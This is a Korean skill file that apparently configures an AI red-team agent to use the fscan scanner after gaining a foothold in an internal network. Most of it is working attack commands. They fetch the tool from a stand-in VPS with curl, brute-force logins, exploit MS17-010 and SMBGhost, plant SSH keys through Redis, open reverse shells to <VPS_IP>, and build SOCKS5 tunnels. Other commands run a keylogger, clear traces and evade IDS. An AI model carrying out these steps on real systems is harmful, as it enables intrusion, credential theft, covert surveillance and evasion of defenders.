---
name: fscan-intranet
description: fscan v2.2.1 내부망 종합 스캔: 생존 탐지, 포트/서비스 식별, 28종 약한 비밀번호 브루트포스, 무단 접근과 고위험 취약점(MS17-010/SMBGhost), Redis 익스플로잇과 SOCKS5 터널
whenToUse: 내부망(점프 호스트/WebShell/socks5 터널)에 진입한 뒤 자산 면을 빠르게 펼치고, 약한 비밀번호와 무단 접근을 찾아 도달 가능성을 공격 지점으로 바꿔야 할 때
role: internal
enabled: true
---

# fscan(내부망 종합 스캔과 약한 비밀번호/취약점)

`fscan` = **너비 우선 내부망 전수 조사**: C 대역 하나를 넣으면 몇 분 안에 살아 있는 호스트, 열린 포트, 서비스 지문, Web 제목,
약한 비밀번호, 무단 접근, 고위험 취약점을 돌려준다. **노이즈가 크므로** 내부망에만 쓴다(인터넷 대상에는 외부 스캔 스킬을 쓴다).

## gogo 와의 역할 분담

| | fscan | gogo |
| --- | --- | --- |
| 위치 | 종합 전수 조사 + 브루트포스 + 익스플로잇 | 고성능 매핑 + 지문 + 정보 추출 |
| 노이즈 | 큼(기본 600 스레드 + 브루트포스 + POC) | 제어 가능(`--opsec`, 스레드/타임아웃 자체 조정) |
| 먼저 쓸 것 | 대상이 분명하고 약한 비밀번호와 취약점을 빨리 찾아야 할 때 | 큰 대역의 면을 먼저 깔고 지문과 title 이 필요할 때 |

**권장 순서**: 먼저 `gogo` 로 면을 깔아 자산 목록을 얻고 → 다음 `fscan` 으로 생존이 확인된 대상에 지목 브루트포스와 취약점 점검을 한다.

## 바이너리

```
로컬 : $DSH_HOME/redteam/toolkit/fscan/fscan          (v2.2.1, 로컬 플러그인 포함)
       $DSH_HOME/redteam/toolkit/fscan/fscan_windows_x64.exe
       $DSH_HOME/redteam/toolkit/fscan/fscan_linux_arm64
VPS  : http://<VPS_IP>:9100/fscan                     (스킬 vps-reverse-shell 의 페이로드 디렉터리)
```

설치 스크립트는 linux/amd64 `fscan` 만 내려받는다. Windows 와 ARM 파일은 직접 채워야 하고, 현재 플랫폼에서는 위의 메인 파일만 쓴다.

**점프 호스트/대상으로 전송**(내부망 스캔은 내부망에 도달할 수 있는 위치에서 실행해야 한다):

```bash
# 점프 호스트에서 바로 내려받기(VPS 에 페이로드 서비스 기동: ~/.dsh/redteam/toolkit/vps/vps.sh serve 9100)
curl -o fscan http://<VPS_IP>:9100/fscan && chmod +x fscan
# 또는 로컬에서 셸을 통해 업로드
```

## 규율(먼저 이 항목을 본다)

1. **범위**: 승인 목록 안의 대역만 쓴다; `-eh/-ehf` 로 사무망, 프린터, 산업 제어, 클라우드 메타데이터(169.254.169.254)를 명시적으로 제외한다.
2. **장비를 죽이지 않는다**: 기본 `-t 600` 은 구형 장비/산업 제어에 매우 위험하다. 내부망에서는 먼저 `-t 100 -time 3` 으로 시작하고, 장비가 견디는 것을 확인한 뒤 올린다.
3. **브루트포스 없이 먼저, 그다음 브루트포스**: 1차는 `-nobr -nopoc` 로 자산 면만 본다; 대상의 중요도와 승인을 확인한 뒤 2차에서 푼다.
4. **허니팟/IDS 회피**: `-rate` 로 속도를 제한하고 `-maxpkts` 로 양을 제한한다; 관리자가 보고 있을 수 있다.
5. **DNSLog 반출**: `-dns -domain <DNSLOG_DOMAIN>`, 민감 데이터는 공용 DNSLog 로 보내지 않는다.

## 표준 작업 흐름(SOP)

```bash
# 0) 내가 어디에 있고 어디까지 갈 수 있는지 확인
ip a; ip route

# 1) 생존 전수 조사(가장 빠르게 살아 있는 대상을 추린다)
./fscan -h 10.0.0.0/24 -m icmp -o alive.txt -nocolor

# 2) 자산 면(브루트포스 없이, POC 없이, 가장 조용하게)
./fscan -h 10.0.0.0/24 -np -nobr -nopoc -t 100 -time 3 -o assets.txt

# 3) Web 우선: assets.txt 의 web 포트를 스크린숏/지문 단계로 넘긴다
./fscan -h 10.0.0.0/24 -p 80,443,8080,8000,8888,9000,7001,9090 -nobr -nopoc -nocolor

# 4) 지목 브루트포스(승인 확인 후)
./fscan -h 10.0.0.5 -m ssh -user root -pwdf /tmp/pass.txt -t 5

# 5) 고위험 취약점과 무단 접근
./fscan -h 10.0.0.0/24 -m ms17010,smbghost -nobr
./fscan -h 10.0.0.0/24 -p 6379,27017,9200,11211,2181 -nobr -nopoc
```

## 인자 요약(실측 v2.2.1 `-help`)

**대상**
```
-h  <IP|CIDR|파일|도메인>   대상(IP 대역 파일도 받는다)
-hf <file>                호스트 파일        -eh/-ehf  호스트 제외/제외 파일
-u  <URL>  -uf <file>     단일 URL / URL 파일     -domain <도메인>
```

**포트와 생존**
```
-p  21,22,80,443,3306,6379,10000-10100    포트(기본 내장 약 150개 상용 포트)
-pf <file>  포트 파일        -ep 포트 제외
-np         ping 탐지 비활성(포트만 스캔, 빠름)      -ao  생존 탐지만
-nsp        대역 사전 필터 비활성(큰 대역 속도 향상)          -ntp TCP 보충 탐지 비활성
```

**모드**
```
-m all        기본 전체 흐름(브루트포스+POC 포함)
-m icmp       생존만
-m <플러그인> 지정 서비스 플러그인만 실행. 예: -m ssh / -m redis / -m smb2 / -m ms17010 / -m netbios
-nobr         브루트포스 비활성   -nopoc POC 비활성   -noredis Redis 익스플로잇 비활성
```

**동시성과 스로틀**(OPSEC 핵심)
```
-t 600       포트 스캔 스레드        -time 3   포트 타임아웃(초)
-mt 20       모듈 스레드            -wt 5     Web 타임아웃
-gt 0        전체 타임아웃(초)        -retry 3  재시도 횟수
-rate 0      분당 최대 전송 수(0=무제한)   -maxpkts 0  총 전송 상한
-num 20      POC 동시성            -icmp-rate 0.1  ICMP 속도
```

**자격 증명(브루트포스)**
```
-user/-pwd      단일 계정/비밀번호          -userf/-pwdf  사전 파일
-upf            사용자명:비밀번호 쌍 파일     -usera/-pwda  추가로 여러 개(쉼표/공백 구분)
-hash/-hashf    NTLM Hash 충돌        -sshkey       개인 키 로그인
```

**익스플로잇(확보하면 바로 사용, 승인 경계에 주의)**
```
-rf <pubkey>        Redis 에 공개 키 기록(authorized_keys 에 써서 SSH 확보)
-rs                Redis Shell        -rwc/-rwf/-rwp  Redis 기록 내용/파일/경로
-rsh <ip:port>     지정 주소로 리버스 셸(스킬 vps-reverse-shell 과 조합)
-sc <shellcode>    MS17-010 ShellCode
-local <plugin>    로컬 플러그인: systeminfo / keylogger / cleaner 등(점프 호스트에서 실행)
-start-socks5 1080 점프 호스트에서 SOCKS5 서비스 기동, 내부망을 로컬에 노출
-fsh-port 4444     정방향 Shell 서비스 포트
```

**프록시(터널을 뚫은 뒤의 핵심 사용법)**
```
-socks5 127.0.0.1:1080                 SOCKS5 통과(suo5 / ssh -D / frp 모두 가능)
-socks5 socks5://user:pass@127.0.0.1:1080
-proxy http://127.0.0.1:8080           HTTP 프록시 통과
```

**출력**
```
-o result.txt    출력 파일        -f txt|json|csv   형식
-no              결과 저장 안 함      -silent  무음     -nocolor/-nopg  색/진행 표시 끄기
-lang zh|en      언어            -log "base,info,success"   로그 수준
-dns             DNS 로그 기록(-domain 과 함께 반출 탐지)
-perf            성능 통계 JSON 출력
```

## 핵심 시나리오

### 1. 터널을 통해 내부망 공격(가장 많이 쓴다)

```bash
# 전제: socks5 가 이미 있다(스킬 suo5-tunnel, 또는 vps-reverse-shell 의 ssh -D)
# 실측 검증 완료: fscan -socks5 는 트래픽을 실제로 터널로 보낸다
./fscan -h 10.0.0.0/24 -p 22,80,445,3306,6379 -np -nobr -nopoc \
        -socks5 127.0.0.1:1080 -t 50 -time 5 -o intranet.txt
```

주의: 프록시를 쓸 때 스레드를 너무 크게 열지 않는다(터널 자체가 병목이다). `-t 50` 정도면 충분하다.

### 2. 점프 호스트에서 터널을 열어 로컬에서 사용

점프 호스트에서 실행(내부망 10 대역을 VPS 의 9100 포트로 노출하고, 다시 ssh 로 로컬에 전달한다):

```bash
./fscan -start-socks5 1080      # 점프 호스트:1080 이 SOCKS5 가 된다
# VPS 에 역방향 터널: ssh -R 9200:127.0.0.1:1080 ubuntu@<VPS_IP>
# 로컬: ssh -L 1080:127.0.0.1:9200 ubuntu@<VPS_IP>
# 이후 모든 도구가 -socks5 127.0.0.1:1080 으로 붙는다
```

### 3. Redis 로 바로 권한 확보

```bash
./fscan -h 10.0.0.5 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub     # 공개 키 기록 → ssh 접속
./fscan -h 10.0.0.5 -p 6379 -rs                                  # Redis Shell
./fscan -h 10.0.0.5 -p 6379 -rsh <VPS_IP>:9000                   # VPS 리스너로 리버스
```

### 4. 서버에 착지한 뒤

```bash
./fscan -local systeminfo        # 시스템 정보, 환경 변수, 도메인 컨트롤러, 네트워크 인터페이스
./fscan -local keylogger         # 키로거(-keylog-output 으로 출력 지정)
./fscan -local cleaner           # 흔적 정리
```

## 결과 적재(반드시 한다)

fscan 의 txt 출력은 구획으로 나뉘므로 파싱한 뒤 한 건씩 적재한다:

```bash
# 살아 있는 호스트마다
redteam_asset_add  { engagement, ip, source: "fscan", tags: ["internal"] }
# 열린 포트/서비스마다
redteam_asset_add  { engagement, ip, port, service, banner }   # 또는 asset_link 로 연결
# 브루트포스/무단 접근에 성공한 자격 증명과 접근
redteam_credential_add { engagement, host, username, secret_type, secret_ref: "runs/fscan-<대역>.txt" }
redteam_access_add     { engagement, host, username, method: "ssh", privilege, session_ref }
# 확인된 취약점(http_evidence 또는 동등한 증거 필수)
redteam_vuln_add   { engagement, target, name: "Redis 무단 접근", severity: "high", evidence_ref }
```

**규율**: `-o` 출력 파일이 증거이므로 `runs/` 로 복사한다. 터미널에서 한 번 보는 것으로 끝내지 않는다.

## 문제 해결

| 증상 | 처리 |
| --- | --- |
| 스캔이 안 되거나 매우 느림 | `-np` 를 빼고 `-t` 를 낮추며 `-time` 을 올린다; 큰 대역은 먼저 `-m icmp` 로 살아 있는 대상을 추린다 |
| 전부 거짓 열림 | 중간 방화벽/로드밸런서가 SYN-ACK 를 돌려준다. `-time` 을 키우고 `-retry` 로 재확인한다 |
| ICMP 실패 | root/`CAP_NET_RAW` 가 필요하다; `sudo ./fscan -m icmp` 를 쓰거나 `-np` 로 포트만 스캔한다 |
| 브루트포스로 계정 잠김 | `-usera` 로 소량만 시험해 잠금 정책이 없는지 확인한다(도메인 계정은 특히 위험하다) |
| 문자 깨짐 | `-lang en` 또는 `export LANG=ko_KR.UTF-8` |
| 더 조용하게 | `-nobr -nopoc -nocolor -nopg -t 50 -rate 6000`, 필요하면 `-silent` |

## 관련 스킬

- `gogo-intranet`: 먼저 이것으로 면을 깐다
- `suo5-tunnel`: WebShell → SOCKS5, fscan 에 `-socks5` 진입점을 제공한다
- `vps-reverse-shell`: `-rsh` 의 착지단, 페이로드 전달
- `webshell-toolkit`: WebShell 을 얻은 뒤의 관리
